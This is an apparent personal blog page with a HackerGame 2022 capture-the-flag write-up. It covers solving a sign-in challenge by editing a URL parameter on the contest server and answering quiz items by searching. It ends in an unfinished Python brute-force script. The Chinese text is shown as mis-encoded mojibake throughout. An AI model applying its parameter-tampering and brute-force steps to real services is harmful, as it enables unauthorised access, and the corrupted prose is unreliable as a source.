<!DOCTYPE html>
<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript">
  jQuery(document).ready(function($) {
      $("body").click(function(e) {
          var $text = $("<span>â¤</span>");
          if (Math.random() <= 0.02) $text = $("<span>TX!</span>");
          var x = e.pageX, y = e.pageY;
          $text.css({
              "z-index": 1145141919810,
              "top": y,
              "left": x,
              "position": "absolute",
              "pointer-events": "none",
              "transform": "translate(-50%, -50%)",
              "font-weight": "bold",
              "color": "rgb("+~~(255 * Math.random())+","+~~(255 * Math.random())+","+~~(255 * Math.random())+")"
          });
          $("body").append($text);
          $text.animate({
              "top": y - 100,
              "opacity": 0,
              "fontSize": 0,
          },
          1500,
          function() {
              $text.remove();
          });
      });
  });
  var OriginTitile = document.title; 
  document.addEventListener("visibilitychange", function () { 
      if (document.title != "txtxjå‘¼å‘¼zzz") OriginTitile = document.title;
      document.title = document.hidden ? "txtxjå‘¼å‘¼zzz" : OriginTitile;
  });
function showBig(obj) {
  var popup = document.getElementById("popup");
  var img = popup.children[0].children[0];
  img.src = obj.src;
  var scale = 2.0;
  if (img.width * scale > window.innerWidth)
    scale = window.innerWidth / img.width;
  if (img.height * scale > window.innerHeight)
    scale = window.innerHeight / img.height;
  img.style.scale = scale;
  popup.style.display = "block";
}
function hideBig(obj) {
  obj.style.display = "none";
}
function wheelImg(obj) {
  img = obj.children[0].children[0];
  var scale = parseFloat(img.style.scale) || 1.0;
    scale += event.wheelDelta / 1500;
    if (scale < 0.9)
      scale = 0.9;
    if (img.width * scale > window.innerWidth)
      scale = window.innerWidth / img.width;
    if (img.height * scale > window.innerHeight)
      scale = window.innerHeight / img.height;
    img.style.scale = scale;
    return false;
}
</script>
<html><script>
  MathJax = {
    tex: {
      inlineMath: [["$", "$"]],
    },
    displayMath: [
      ["$$", "$$"],
      ["\[\[", "\]\]"],
    ],
    svg: {
      fontCache: "global",
    },
  };
</script>
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"
></script><head>
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

   
    <meta name="author" content="Citrine">
  

  

  

  <meta name="generator" content="Hugo 0.113.0">
  
  
  
  
  
  
  <title>HackerGame2022 WriteUP ğŸŒŸ Citrine</title>

  <meta property="og:title" content="HackerGame2022 WriteUP" />
<meta property="og:description" content="ç¬”è€…æœ¬æ¥æ˜¯ä¸æ‰“ç®—å‚åŠ ä»Šå¹´ HackerGame çš„ï¼ˆå› ä¸ºå»å¹´æ„Ÿè§‰å¥½ç´¯ï¼Œç„¶åæ··äº†ä¸ª 33 åï¼Œé”™å¤±çºªå¿µè¡«ï¼‰ï¼Œä½†æ˜¯å‘¨å…­æ™šä¸Šçœ‹è§ç¾¤é‡Œå¥½å¤šäººæŸ¥èˆªç­ï¼ŒæŠ±ç€æ¥çœ‹çœ‹é¢˜ç›®çš„å¿ƒæ€ç‚¹å¼€äº†æ¯”èµ›é“¾æ¥ï¼Œç„¶åå°±ä¸€å‘ä¸å¯æ”¶æ‹¾äº†ã€‚
ç¬”è€…å¹¶æ²¡æœ‰ç½‘å®‰ã€æ±‡ç¼–æ–¹é¢çš„åŸºç¡€ï¼Œæ•°è®ºæ›´æ˜¯ä¸€å¡Œç³Šæ¶‚ï¼Œåªå†™äº†ä¸€éƒ¨åˆ†é¢˜ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹å†™é¢˜è¿‡ç¨‹ä¸­çš„æ€è·¯ã€‚
ç­¾åˆ° é¢˜ç›®è®©ç­¾ä¸€ä¸ª 2022 ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œç¬¬ä¸‰ä¸ªæ•°å­—æ¥ä¸åŠç”»å°±ç»“æŸäº†ã€‚
å»çœ‹çœ‹ç½‘é¡µæºç ï¼Œæƒ³ç€æ”¹ä¸€ä¸‹æ—¶é—´é™åˆ¶ï¼ŒæŠŠæ—¶é—´æ”¾å®½ç‚¹å†ç­¾ã€‚
ä½†ç»“æœæ˜¯ä¸è¡Œçš„ï¼Œæ—¶é—´é™åˆ¶è¿˜æ˜¯æ²¡å˜ï¼Œåº”è¯¥æ˜¯å› ä¸ºå››ä¸ªç”»æ¿çš„æ—¶é—´é™åˆ¶æ˜¯åœ¨ä¸‹é¢ new Vue çš„æ—¶å€™è®¾ç½®çš„ï¼Œ TIME_LIMIT æ•°ç»„åªæ˜¯ä¸ªä¸´æ—¶å˜é‡ã€‚
åæ¥ç‚¹äº†ä¸€ä¸‹æäº¤ï¼Œçœ‹è§ url æ˜¯ http://202.38.93.111:12022/?result=2??? ï¼Œé‚£å°±ç»™ä»–æ”¹æˆ http://202.38.93.111:12022/?result=2022 è¯•è¯•ï¼ŒæˆåŠŸæ‹¿åˆ° flagã€‚
çœ‹æ¥æ˜¯å’Œå»å¹´ä¸€æ ·çš„ç±»å‹ï¼Œç›´æ¥åœ¨ url ä¸Šåšæ‰‹è„šã€‚
çŒ«å’ªé—®ç­” è€ƒå¯Ÿæœç´¢å¼•æ“ä½¿ç”¨èƒ½åŠ›çš„é¢˜ç›®å–µã€‚
å»å¹´çš„çŒ«å’ªé—®ç­”è®©äººç­”åäº†å–µï¼Œä»Šå¹´çš„çŒ«å’ªé—®ç­”è¦è‰¯å¿ƒä¸å°‘å–µï¼Œç”šè‡³è¿˜æœ‰éƒ¨åˆ†åˆ†å–µã€‚
ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ NEBULA æˆ˜é˜Ÿï¼ˆUSTC NEBULAï¼‰æ˜¯äºä½•æ—¶æˆç«‹çš„å–µï¼Ÿ
ç›´æ¥å¿…åº”æœç´¢â€œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ NEBULA æˆ˜é˜Ÿï¼ˆUSTC NEBULAï¼‰æ˜¯äºä½•æ—¶æˆç«‹çš„å–µï¼Ÿâ€
ç¬¬ä¸€æ¡ç»“æœå°±æ˜¯å–µ
2022 å¹´ 9 æœˆï¼Œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å­¦ç”Ÿ Linux ç”¨æˆ·åä¼šï¼ˆLUG @ USTCï¼‰åœ¨ç§‘å¤§æ ¡å†…æ‰¿åŠäº†è½¯ä»¶è‡ªç”±æ—¥æ´»åŠ¨ã€‚é™¤äº†ä¸“æ³¨äºè‡ªç”±æ’¸çŒ«çš„ä¸»ä¼šåœºä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›å’ŒæŠ€æœ¯ç›¸å…³çš„åˆ†ä¼šåœºï¼ˆå¦‚é—ªç”µæ¼”è®² Lightning Talkï¼‰ã€‚å…¶ä¸­åœ¨ç¬¬ä¸€ä¸ªé—ªç”µæ¼”è®²ä¸»é¢˜é‡Œï¼Œä¸»è®²äººäº slides ä¸­å±•ç¤ºäº†ä¸€å¼ åœ¨ GNOME Wayland ä¸‹ä½¿ç”¨ Wayland åç«¯ä¼šå‡ºç°æ˜¾ç¤ºé—®é¢˜çš„ KDE ç¨‹åºæˆªå›¾ï¼Œè¯·é—®è¿™ä¸ª KDE ç¨‹åºçš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿ
æœç´¢â€œLUG @ USTC é—ªç”µæ¼”è®² 2022â€å–µï¼Œæ‰¾åˆ° lug ä¸»é¡µä¸Šçš„ä¸€ç¯‡æ–°é—»ç¨¿å–µï¼Œä½†æ˜¯é‡Œé¢æ²¡æœ‰æåˆ°é¢˜ç›®é—®çš„ä¿¡æ¯å–µã€‚
ç»§ç»­åœ¨ lug ä¸»é¡µä¸Šæœç´¢å–µï¼Œæ‰¾åˆ°â€œè‡ªç”±è½¯ä»¶æ—¥â€å­é¡µé¢å–µï¼Œè®°å½•äº†å†å¹´çš„æ´»åŠ¨è¯¦æƒ…å–µï¼ŒåŒ…å« Slides å’Œå›æ”¾å–µã€‚" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://txtxj.top/posts/hackergame2022/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-27T19:48:31+08:00" />
<meta property="article:modified_time" content="2022-10-27T19:48:31+08:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HackerGame2022 WriteUP"/>
<meta name="twitter:description" content="ç¬”è€…æœ¬æ¥æ˜¯ä¸æ‰“ç®—å‚åŠ ä»Šå¹´ HackerGame çš„ï¼ˆå› ä¸ºå»å¹´æ„Ÿè§‰å¥½ç´¯ï¼Œç„¶åæ··äº†ä¸ª 33 åï¼Œé”™å¤±çºªå¿µè¡«ï¼‰ï¼Œä½†æ˜¯å‘¨å…­æ™šä¸Šçœ‹è§ç¾¤é‡Œå¥½å¤šäººæŸ¥èˆªç­ï¼ŒæŠ±ç€æ¥çœ‹çœ‹é¢˜ç›®çš„å¿ƒæ€ç‚¹å¼€äº†æ¯”èµ›é“¾æ¥ï¼Œç„¶åå°±ä¸€å‘ä¸å¯æ”¶æ‹¾äº†ã€‚
ç¬”è€…å¹¶æ²¡æœ‰ç½‘å®‰ã€æ±‡ç¼–æ–¹é¢çš„åŸºç¡€ï¼Œæ•°è®ºæ›´æ˜¯ä¸€å¡Œç³Šæ¶‚ï¼Œåªå†™äº†ä¸€éƒ¨åˆ†é¢˜ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹å†™é¢˜è¿‡ç¨‹ä¸­çš„æ€è·¯ã€‚
ç­¾åˆ° é¢˜ç›®è®©ç­¾ä¸€ä¸ª 2022 ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œç¬¬ä¸‰ä¸ªæ•°å­—æ¥ä¸åŠç”»å°±ç»“æŸäº†ã€‚
å»çœ‹çœ‹ç½‘é¡µæºç ï¼Œæƒ³ç€æ”¹ä¸€ä¸‹æ—¶é—´é™åˆ¶ï¼ŒæŠŠæ—¶é—´æ”¾å®½ç‚¹å†ç­¾ã€‚
ä½†ç»“æœæ˜¯ä¸è¡Œçš„ï¼Œæ—¶é—´é™åˆ¶è¿˜æ˜¯æ²¡å˜ï¼Œåº”è¯¥æ˜¯å› ä¸ºå››ä¸ªç”»æ¿çš„æ—¶é—´é™åˆ¶æ˜¯åœ¨ä¸‹é¢ new Vue çš„æ—¶å€™è®¾ç½®çš„ï¼Œ TIME_LIMIT æ•°ç»„åªæ˜¯ä¸ªä¸´æ—¶å˜é‡ã€‚
åæ¥ç‚¹äº†ä¸€ä¸‹æäº¤ï¼Œçœ‹è§ url æ˜¯ http://202.38.93.111:12022/?result=2??? ï¼Œé‚£å°±ç»™ä»–æ”¹æˆ http://202.38.93.111:12022/?result=2022 è¯•è¯•ï¼ŒæˆåŠŸæ‹¿åˆ° flagã€‚
çœ‹æ¥æ˜¯å’Œå»å¹´ä¸€æ ·çš„ç±»å‹ï¼Œç›´æ¥åœ¨ url ä¸Šåšæ‰‹è„šã€‚
çŒ«å’ªé—®ç­” è€ƒå¯Ÿæœç´¢å¼•æ“ä½¿ç”¨èƒ½åŠ›çš„é¢˜ç›®å–µã€‚
å»å¹´çš„çŒ«å’ªé—®ç­”è®©äººç­”åäº†å–µï¼Œä»Šå¹´çš„çŒ«å’ªé—®ç­”è¦è‰¯å¿ƒä¸å°‘å–µï¼Œç”šè‡³è¿˜æœ‰éƒ¨åˆ†åˆ†å–µã€‚
ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ NEBULA æˆ˜é˜Ÿï¼ˆUSTC NEBULAï¼‰æ˜¯äºä½•æ—¶æˆç«‹çš„å–µï¼Ÿ
ç›´æ¥å¿…åº”æœç´¢â€œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ NEBULA æˆ˜é˜Ÿï¼ˆUSTC NEBULAï¼‰æ˜¯äºä½•æ—¶æˆç«‹çš„å–µï¼Ÿâ€
ç¬¬ä¸€æ¡ç»“æœå°±æ˜¯å–µ
2022 å¹´ 9 æœˆï¼Œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å­¦ç”Ÿ Linux ç”¨æˆ·åä¼šï¼ˆLUG @ USTCï¼‰åœ¨ç§‘å¤§æ ¡å†…æ‰¿åŠäº†è½¯ä»¶è‡ªç”±æ—¥æ´»åŠ¨ã€‚é™¤äº†ä¸“æ³¨äºè‡ªç”±æ’¸çŒ«çš„ä¸»ä¼šåœºä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›å’ŒæŠ€æœ¯ç›¸å…³çš„åˆ†ä¼šåœºï¼ˆå¦‚é—ªç”µæ¼”è®² Lightning Talkï¼‰ã€‚å…¶ä¸­åœ¨ç¬¬ä¸€ä¸ªé—ªç”µæ¼”è®²ä¸»é¢˜é‡Œï¼Œä¸»è®²äººäº slides ä¸­å±•ç¤ºäº†ä¸€å¼ åœ¨ GNOME Wayland ä¸‹ä½¿ç”¨ Wayland åç«¯ä¼šå‡ºç°æ˜¾ç¤ºé—®é¢˜çš„ KDE ç¨‹åºæˆªå›¾ï¼Œè¯·é—®è¿™ä¸ª KDE ç¨‹åºçš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿ
æœç´¢â€œLUG @ USTC é—ªç”µæ¼”è®² 2022â€å–µï¼Œæ‰¾åˆ° lug ä¸»é¡µä¸Šçš„ä¸€ç¯‡æ–°é—»ç¨¿å–µï¼Œä½†æ˜¯é‡Œé¢æ²¡æœ‰æåˆ°é¢˜ç›®é—®çš„ä¿¡æ¯å–µã€‚
ç»§ç»­åœ¨ lug ä¸»é¡µä¸Šæœç´¢å–µï¼Œæ‰¾åˆ°â€œè‡ªç”±è½¯ä»¶æ—¥â€å­é¡µé¢å–µï¼Œè®°å½•äº†å†å¹´çš„æ´»åŠ¨è¯¦æƒ…å–µï¼ŒåŒ…å« Slides å’Œå›æ”¾å–µã€‚"/>


  
  
  
  
  <link rel="stylesheet" href="https://txtxj.top/assets/css/style.min.6e3ac0eda5e29b4defbb8703b907761f5bd385b098d693edcdae4acfac2039fe.css" integrity="sha256-bjrA7aXim03vu4cDuQd2H1vThbCY1pPtza5Kz6wgOf4=">

  <script src="https://txtxj.top/assets/js/main.min.597d9f5a80ce3137282a06b1b2cdbb5a481f3ae5ef0d0ba4265c177b6d788b36.js" integrity="sha256-WX2fWoDOMTcoKgaxss27WkgfOuXvDQukJlwXe214izY="></script>
  
  </head><body><header class="header-container layout-block layout-padding">
  <div class="header-inner content-padding-large soft-size--large soft-style--box">
    <div class="header-logo">
      <a href="https://txtxj.top"><h1><img class="author-avatar soft-size--round soft-style--box" src="https://avatars.githubusercontent.com/u/47293990?s=100">&nbspCitrine</h1></a>
    </div>
    <nav class="header-nav">
      <div class="header-nav--btn">
        <div class="btn-item"></div>
        <div class="btn-item"></div>
        <div class="btn-item"></div>
      </div>
      <div class="header-nav--list">
        <div>
          
          <a class="list-item soft-size--small soft-style--hover soft-style--active" href="/" title="">ğŸ  ä¸»é¡µ</a>
          
          <a class="list-item soft-size--small soft-style--hover soft-style--active" href="/posts" title="">ğŸ—‚ï¸ åšå®¢</a>
          
          <a class="list-item soft-size--small soft-style--hover soft-style--active" href="/games" title="">ğŸ® ç”µåŠ¨</a>
          
          <a class="list-item soft-size--small soft-style--hover soft-style--active" href="/tags" title="">ğŸ·ï¸ æ ‡ç­¾</a>
          
          <a class="list-item soft-size--small soft-style--hover soft-style--active" href="/link" title="">ğŸ”— å‹é“¾</a>
          
        </div>
      </div>
    </nav>
  </div>
</header><main id="content">
    

    <div class="single-container layout-block">
      <div class="article-info">
        <div class="article-header layout-padding">
          <div class="article-cover card-container content-padding-large soft-size--large soft-style--box img">

  <div class="card-cover">
    
      <img src="https://s2.loli.net/2022/10/29/NjFDgTRwUaCiGQP.jpg" alt="https://s2.loli.net/2022/10/29/NjFDgTRwUaCiGQP.jpg" />
    
  </div>

  <div class="card-text">
    <h1 class="card-text--title">HackerGame2022 WriteUP</h1>
    
      <p class="card-text--row">2022-10-27 19:48</p>
      
      
      

      
      
        <ul class="card-text--tag">
          
            <li><a href="https://txtxj.top/tags/%E9%A2%98%E8%A7%A3/">é¢˜è§£</a></li></ul>
      
    
  </div>

</div>
        </div>

        <div class="article-content">
          <div class="markdown-body content-padding-large soft-size--large soft-style--box">
            <p>ç¬”è€…æœ¬æ¥æ˜¯ä¸æ‰“ç®—å‚åŠ ä»Šå¹´ HackerGame çš„ï¼ˆå› ä¸ºå»å¹´æ„Ÿè§‰å¥½ç´¯ï¼Œç„¶åæ··äº†ä¸ª 33 åï¼Œé”™å¤±çºªå¿µè¡«ï¼‰ï¼Œä½†æ˜¯å‘¨å…­æ™šä¸Šçœ‹è§ç¾¤é‡Œå¥½å¤šäººæŸ¥èˆªç­ï¼ŒæŠ±ç€æ¥çœ‹çœ‹é¢˜ç›®çš„å¿ƒæ€ç‚¹å¼€äº†æ¯”èµ›é“¾æ¥ï¼Œç„¶åå°±ä¸€å‘ä¸å¯æ”¶æ‹¾äº†ã€‚</p>
<p>ç¬”è€…å¹¶æ²¡æœ‰ç½‘å®‰ã€æ±‡ç¼–æ–¹é¢çš„åŸºç¡€ï¼Œæ•°è®ºæ›´æ˜¯ä¸€å¡Œç³Šæ¶‚ï¼Œåªå†™äº†ä¸€éƒ¨åˆ†é¢˜ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹å†™é¢˜è¿‡ç¨‹ä¸­çš„æ€è·¯ã€‚</p>
<h2 id="ç­¾åˆ°">ç­¾åˆ°</h2>
<p>é¢˜ç›®è®©ç­¾ä¸€ä¸ª 2022 ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œç¬¬ä¸‰ä¸ªæ•°å­—æ¥ä¸åŠç”»å°±ç»“æŸäº†ã€‚</p>
<p>å»çœ‹çœ‹ç½‘é¡µæºç ï¼Œæƒ³ç€æ”¹ä¸€ä¸‹æ—¶é—´é™åˆ¶ï¼ŒæŠŠæ—¶é—´æ”¾å®½ç‚¹å†ç­¾ã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/CNDgrSQsfaWZH49.png" alt="20221027_1.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>ä½†ç»“æœæ˜¯ä¸è¡Œçš„ï¼Œæ—¶é—´é™åˆ¶è¿˜æ˜¯æ²¡å˜ï¼Œåº”è¯¥æ˜¯å› ä¸ºå››ä¸ªç”»æ¿çš„æ—¶é—´é™åˆ¶æ˜¯åœ¨ä¸‹é¢ <code>new Vue</code> çš„æ—¶å€™è®¾ç½®çš„ï¼Œ <code>TIME_LIMIT</code> æ•°ç»„åªæ˜¯ä¸ªä¸´æ—¶å˜é‡ã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/DURlG2XTZq6N1MP.png" alt="20221027_2.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>åæ¥ç‚¹äº†ä¸€ä¸‹æäº¤ï¼Œçœ‹è§ url æ˜¯ <code>http://202.38.93.111:12022/?result=2???</code> ï¼Œé‚£å°±ç»™ä»–æ”¹æˆ <code>http://202.38.93.111:12022/?result=2022</code> è¯•è¯•ï¼ŒæˆåŠŸæ‹¿åˆ° flagã€‚</p>
<p>çœ‹æ¥æ˜¯å’Œå»å¹´ä¸€æ ·çš„ç±»å‹ï¼Œç›´æ¥åœ¨ url ä¸Šåšæ‰‹è„šã€‚</p>
<h2 id="çŒ«å’ªé—®ç­”">çŒ«å’ªé—®ç­”</h2>
<p>è€ƒå¯Ÿæœç´¢å¼•æ“ä½¿ç”¨èƒ½åŠ›çš„é¢˜ç›®å–µã€‚</p>
<p>å»å¹´çš„çŒ«å’ªé—®ç­”è®©äººç­”åäº†å–µï¼Œä»Šå¹´çš„çŒ«å’ªé—®ç­”è¦è‰¯å¿ƒä¸å°‘å–µï¼Œç”šè‡³è¿˜æœ‰éƒ¨åˆ†åˆ†å–µã€‚</p>
<blockquote>
<p>ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ NEBULA æˆ˜é˜Ÿï¼ˆUSTC NEBULAï¼‰æ˜¯äºä½•æ—¶æˆç«‹çš„å–µï¼Ÿ</p>
</blockquote>
<p>ç›´æ¥å¿…åº”æœç´¢â€œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ NEBULA æˆ˜é˜Ÿï¼ˆUSTC NEBULAï¼‰æ˜¯äºä½•æ—¶æˆç«‹çš„å–µï¼Ÿâ€</p>
<p>ç¬¬ä¸€æ¡ç»“æœå°±æ˜¯å–µ</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/H1gc2huri6bnWJY.png" alt="20221027_3.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<blockquote>
<p>2022 å¹´ 9 æœˆï¼Œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å­¦ç”Ÿ Linux ç”¨æˆ·åä¼šï¼ˆLUG @ USTCï¼‰åœ¨ç§‘å¤§æ ¡å†…æ‰¿åŠäº†è½¯ä»¶è‡ªç”±æ—¥æ´»åŠ¨ã€‚é™¤äº†ä¸“æ³¨äºè‡ªç”±æ’¸çŒ«çš„ä¸»ä¼šåœºä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›å’ŒæŠ€æœ¯ç›¸å…³çš„åˆ†ä¼šåœºï¼ˆå¦‚é—ªç”µæ¼”è®² Lightning Talkï¼‰ã€‚å…¶ä¸­åœ¨ç¬¬ä¸€ä¸ªé—ªç”µæ¼”è®²ä¸»é¢˜é‡Œï¼Œä¸»è®²äººäº slides ä¸­å±•ç¤ºäº†ä¸€å¼ åœ¨ GNOME Wayland ä¸‹ä½¿ç”¨ Wayland åç«¯ä¼šå‡ºç°æ˜¾ç¤ºé—®é¢˜çš„ KDE ç¨‹åºæˆªå›¾ï¼Œè¯·é—®è¿™ä¸ª KDE ç¨‹åºçš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿ</p>
</blockquote>
<p>æœç´¢â€œLUG @ USTC é—ªç”µæ¼”è®² 2022â€å–µï¼Œæ‰¾åˆ° lug ä¸»é¡µä¸Šçš„ä¸€ç¯‡æ–°é—»ç¨¿å–µï¼Œä½†æ˜¯é‡Œé¢æ²¡æœ‰æåˆ°é¢˜ç›®é—®çš„ä¿¡æ¯å–µã€‚</p>
<p>ç»§ç»­åœ¨ lug ä¸»é¡µä¸Šæœç´¢å–µï¼Œæ‰¾åˆ°â€œè‡ªç”±è½¯ä»¶æ—¥â€å­é¡µé¢å–µï¼Œè®°å½•äº†å†å¹´çš„æ´»åŠ¨è¯¦æƒ…å–µï¼ŒåŒ…å« Slides å’Œå›æ”¾å–µã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/epJVFL5GDmWqOv4.png" alt="20221027_4.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>å…ˆæŠŠ Slides ä¸‹è½½ä¸‹æ¥çœ‹çœ‹å–µï¼Œå¯ä»¥æ¨æµ‹å‡ºæ¥é¢˜ç›®æ˜¯åœ¨é—®ä¸‹é¢è¿™ä¸€å¼ ä¸­å‡ºç°çš„æˆªå›¾æ˜¯ä»€ä¹ˆè½¯ä»¶å–µï¼Œä½†æ˜¯æˆªå›¾ä¸Šå¹¶æ²¡æœ‰æ˜¾ç¤ºè½¯ä»¶åå–µã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/g79WbMlKI1tZcei.png" alt="20221027_5.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>å†å»çœ‹çœ‹å›è®¿å–µï¼Œå®šä½åˆ° 2:42:04 å–µï¼Œå¬åˆ° taoky è¯´äº†ä¸€ä¸ªè½¯ä»¶åå–µï¼Œèƒ½å¬å‡ºæ¥çš„å‡ ä¸ªéŸ³èŠ‚æ˜¯ k d live æˆ–è€… life å–µã€‚å»æœç´¢â€œk d liveâ€å–µï¼Œç¬¬ä¸€æ¡è®°å½•æ˜¯ Kdenlive å–µï¼Œå‘éŸ³ç¬¦åˆå–µï¼Œå»è¯•äº†ä¸€ä¸‹å–µï¼Œæ˜¯æ­£ç¡®ç­”æ¡ˆå–µã€‚</p>
<blockquote>
<p>22 å¹´åšæŒï¼Œå° C ä»ç„¶ä½¿ç”¨ç€ä¸€å°ä»–ä»å°ç”¨åˆ°å¤§çš„ Windows 2000 è®¡ç®—æœºã€‚é‚£ä¹ˆï¼Œåœ¨ä¸å˜æ›´ç³»ç»Ÿé…ç½®å’Œç¨‹åºä»£ç çš„å‰æä¸‹ï¼ŒFirefox æµè§ˆå™¨èƒ½åœ¨ Windows 2000 ä¸‹è¿è¡Œçš„æœ€åä¸€ä¸ªå¤§ç‰ˆæœ¬å·æ˜¯å¤šå°‘ï¼Ÿ</p>
</blockquote>
<p>ç›´æ¥æœç´¢â€œFirefox æµè§ˆå™¨èƒ½åœ¨ Windows 2000 ä¸‹è¿è¡Œçš„æœ€åä¸€ä¸ªå¤§ç‰ˆæœ¬å·æ˜¯å¤šå°‘â€å–µï¼Œå‡ºç°â€œFirefox 13 ä¸å†æ”¯æŒ Windows 2000â€å–µã€‚ç­”æ¡ˆæ˜¯ 12 å–µã€‚</p>
<blockquote>
<p>ä½ çŸ¥é“ PwnKitï¼ˆCVE-2021-4034ï¼‰å–µï¼Ÿæ®å¯é è°£ä¼ ï¼Œå‡ºé¢˜ç»„çš„æŸä½åŒå­¦æœ¬æ¥æƒ³å‡ºè¿™æ ·ä¸€é“ç±»ä¼¼çš„é¢˜ï¼Œä½†æ˜¯å‘ç° Linux å†…æ ¸æ›´æ–°ä¹‹åå±…ç„¶ä¸å†å…è®¸ argc ä¸º 0 äº†å–µï¼é‚£ä¹ˆï¼Œè¯·æ‰¾å‡ºåœ¨ Linux å†…æ ¸ master åˆ†æ”¯ï¼ˆtorvalds/linux.gitï¼‰ä¸‹ï¼Œé¦–ä¸ªå˜åŠ¨æ­¤è¡Œä¸ºçš„ commit çš„ hash å§å–µï¼</p>
</blockquote>
<p>å» GitHub æ‰¾ä»“åº“ torvalds/linux å–µï¼Œä»“åº“å†…æœç´¢ PwnKit å–µï¼Œæ‰¾åˆ°ä¸€æ¡ Commit è®°å½•å–µï¼Œhash å€¼ä¸º dcd46d897adb70d63e025f175a00a89797d31a43 å–µã€‚</p>
<blockquote>
<p>é€šè¿‡ç›‘è§†çŒ«å’ªåœ¨é”®ç›˜ä¸Šçœ‹ä¼¼ä¹±è¸©çš„æ•…æ„è¡Œä¸ºï¼Œä¸å‡ºæ‰€æ–™å‘ç°å…¶ç§˜å¯†è¿ä¸Šäº†ä¸€ä¸ª ssh æœåŠ¡å™¨ï¼Œç»ˆç«¯æ˜¾ç¤º ED25519 key fingerprint is MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce.ï¼Œä½ çŸ¥é“çŒ«å’ªåœ¨è¿æ¥ä»€ä¹ˆåŸŸåå—ï¼Ÿ</p>
</blockquote>
<p>è¿™ä¸€é¢˜æ˜¯æœ€åå†™çš„å–µï¼Œå®Œå…¨æ²¡æœ‰å¤´ç»ªå–µã€‚å› ä¸ºé¢˜ç›®æç¤ºäº†åªæœ‰ 6 ä¸ªå„ä¸ç›¸åŒçš„å­—æ¯å–µï¼Œè€ƒè™‘åˆ°å¸¸ç”¨é¡¶çº§åŸŸåä¹Ÿå°± com org net å–µï¼Œå°±ç›´æ¥åšäº†ä¸ª Python ç¨‹åºæš´åŠ›æšä¸¾äº†å–µã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>q5 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, ord(<span style="color:#e6db74">&#39;o&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>, ord(<span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>, ord(<span style="color:#e6db74">&#39;g&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_str</span>():
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> q5:
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">+=</span> chr(<span style="color:#ae81ff">97</span> <span style="color:#f92672">+</span> c)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> ret[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> ret[<span style="color:#ae81ff">3</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>	q5[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
